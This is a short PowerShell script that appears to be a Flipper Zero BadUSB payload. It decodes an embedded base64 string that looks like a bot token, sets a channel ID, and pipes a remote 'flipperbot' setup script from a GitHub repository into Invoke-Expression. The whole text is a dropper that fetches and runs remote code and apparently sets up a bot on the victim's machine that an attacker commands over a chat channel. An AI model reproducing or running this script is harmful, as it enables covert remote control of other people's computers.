[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12
$bt=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('TVRVeU16QTJNemcyTURrM01qYzFNekV5T1EuR2daT1ZMLjFrQnZjYUxyV0pGbkp4Uk96YzY4MFZsSTBRUWs5MW1KWVR2TU93'))
$ch='1523068548929425580'
irm https://raw.githubusercontent.com/ironpxs/flipper_scripts/main/flipperbot/f44b1874d8cce12b_setup.ps1 | iex
